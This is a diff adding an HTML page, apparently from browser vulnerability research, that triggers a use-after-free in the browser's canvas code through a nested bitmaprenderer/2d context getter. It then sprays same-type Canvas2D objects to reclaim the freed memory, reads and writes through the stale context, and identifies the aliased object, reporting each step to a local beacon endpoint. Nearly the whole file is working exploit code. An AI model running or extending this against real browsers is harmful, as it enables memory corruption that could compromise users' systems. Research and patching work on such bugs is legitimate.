@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>V926B</title></head>
+<body><pre id="out">V926B — same-type reclaim alias check (V573 pattern, B-session)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){
+  try{new Image().src='/beacon/V926B-'+tag+'?d='+encodeURIComponent(String(body).slice(0,400))+'&t='+Date.now()+'&s=1';}catch(e){}
+}
+
+var f64buf=new Float64Array(1);
+var u32buf=new Uint32Array(f64buf.buffer);
+function dblBits(d){f64buf[0]=d;return{lo:u32buf[0],hi:u32buf[1]};}
+function hex8(v){return('00000000'+((v>>>0).toString(16))).slice(-8);}
+function hexPair(hi,lo){return'0x'+hex8(hi)+hex8(lo);}
+
+var P=new URLSearchParams(location.search);
+var NSAVES=+(P.get('saves')||'32');
+var NSPRAY=+(P.get('spray')||'300');
+var MARKER=+(P.get('marker')||'7777.77');
+
+/* ===== BOOT ===== */
+bk('BOOT','saves='+NSAVES+',spray='+NSPRAY+',marker='+MARKER);
+say('BOOT: saves='+NSAVES+' spray='+NSPRAY+' marker='+MARKER);
+
+/* ===== triggerUAF (bitmaprenderer outer + 2d inner, V573 pattern) ===== */
+var innerCtx=null;
+function triggerUAF(){
+  var c=document.createElement('canvas');
+  c.width=1;c.height=1;
+  var d={};
+  Object.defineProperty(d,'alpha',{get:function(){
+    var ctx=c.getContext('2d');
+    innerCtx=ctx;
+    for(var s=0;s<NSAVES;s++) ctx.save();
+    ctx.lineWidth=1.0;
+    return true;
+  }});
+  c.getContext('bitmaprenderer',d);
+  return c;
+}
+
+bk('PRE-UAF','triggering');
+var outerC=triggerUAF();
+bk('POST-UAF','ctx='+(innerCtx?'OK':'NULL'));
+say('POST-UAF: innerCtx='+(innerCtx?'OK':'NULL'));
+if(!innerCtx){ bk('FAIL','no-inner'); say('FAIL: no inner context'); }
+
+/* ===== SPRAY — same-type Canvas2D reclaim (do not touch innerCtx before this) ===== */
+var sprayCanvases=[];
+var sprayCtxs=[];
+for(var i=0;i<NSPRAY;i++){
+  var sc=document.createElement('canvas');
+  sc.width=1;sc.height=1;
+  var sctx=sc.getContext('2d');
+  if(sctx){
+    sctx.lineWidth=MARKER;
+    sprayCanvases.push(sc);
+    sprayCtxs.push(sctx);
+  }
+}
+bk('SPRAY','n='+sprayCtxs.length);
+say('SPRAY: created '+sprayCtxs.length+' contexts with marker='+MARKER);
+
+/* ===== READ — stale wrapper ===== */
+var lwR, mlR, gaR, errR;
+try { lwR=innerCtx.lineWidth; } catch(e){ errR='lw:'+e.message; }
+try { mlR=innerCtx.miterLimit; } catch(e){ errR=(errR||'')+' ml:'+e.message; }
+try { gaR=innerCtx.globalAlpha; } catch(e){ errR=(errR||'')+' ga:'+e.message; }
+
+if(errR){
+  bk('READ','ERR:'+String(errR).slice(0,200));
+  say('READ ERR: '+errR);
+} else {
+  var lwBits=dblBits(lwR), mlBits=dblBits(mlR), gaBits=dblBits(gaR);
+  bk('READ','lw='+lwR+',ml='+mlR+',ga='+gaR);
+  bk('BITS','lw='+hexPair(lwBits.hi,lwBits.lo)+',ml='+hexPair(mlBits.hi,mlBits.lo)+',ga='+hexPair(gaBits.hi,gaBits.lo));
+  say('READ: lineWidth='+lwR+' raw='+hexPair(lwBits.hi,lwBits.lo));
+  say('  miterLimit='+mlR+' globalAlpha='+gaR);
+
+  if(lwR===MARKER){ bk('RECLAIM','CONFIRMED-marker='+MARKER); say('*** RECLAIM CONFIRMED ***'); }
+  else if(lwR===1.0){ bk('ALIVE','lineWidth=1-default-or-refpin'); say('lineWidth=1.0 (default/refpin)'); }
+  else { bk('STALE','lineWidth='+lwR); say('UNEXPECTED lineWidth'); }
+}
+
+/* ===== WRITE ===== */
+var writeOK=false;
+try {
+  innerCtx.lineWidth=9999.99;
+  var lwW=innerCtx.lineWidth;
+  writeOK=(lwW===9999.99);
+  bk('WRITE','set=9999.99,read='+lwW+',ok='+writeOK);
+  say('WRITE: readback '+lwW+' ok='+writeOK);
+} catch(e){ bk('WRITE','ERR:'+e.message); say('WRITE ERR: '+e.message); }
+
+/* ===== ALIAS-ID ===== */
+if(!errR && lwR===MARKER){
+  for(var i=0;i<sprayCtxs.length;i++){
+    if(sprayCtxs[i].lineWidth===9999.99){
+      bk('ALIAS','idx='+i+',lw='+sprayCtxs[i].lineWidth);
+      say('ALIAS: spray #'+i+' reads 9999.99');
+      break;
+    }
+  }
+}
+
+/* ===== extra API checks ===== */
+try { var dashR=innerCtx.getLineDash(); bk('DASH','len='+dashR.length); } catch(e){ bk('DASH','ERR:'+e.message); }
+try { var fsR=innerCtx.fillStyle; bk('FILL',String(fsR).slice(0,60)); } catch(e){ bk('FILL','ERR:'+e.message); }
+try { var t=innerCtx.getTransform(); bk('TX','a='+t.a+',d='+t.d+',e='+t.e+',f='+t.f); } catch(e){ bk('TX','ERR:'+e.message); }
+
+bk('DONE','complete');
+say('\nV926B complete.');
+</script>
+</body></html>
